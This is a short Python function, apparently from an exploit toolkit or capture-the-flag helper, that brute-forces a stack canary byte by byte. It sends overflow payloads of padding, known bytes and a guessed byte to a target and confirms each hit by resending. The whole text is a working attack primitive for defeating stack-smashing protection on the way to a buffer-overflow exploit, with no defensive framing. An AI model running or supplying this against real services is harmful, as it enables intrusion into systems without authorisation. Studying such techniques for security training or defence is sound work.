def brute_force_canary(
    tgt, offset, length=8, confirm=3, timeout=0.2, prefix=b"", pad=b"A"
):
    known = b"\x00" if length > 4 else b""
    for byte_index in range(len(known), length):
        for guess in range(256):
            payload = prefix + pad * offset + known + bytes([guess])
            if tgt.send(payload, timeout) and all(
                tgt.send(payload, timeout) for _ in range(confirm)
            ):
                known += bytes([guess])
                break
        else:  # for-loop exhausted without break
            raise RuntimeError(
                f"Brute-force stalled at byte {byte_index} "
                f"(timeout={timeout}s, offset={offset})"
            )
    return known
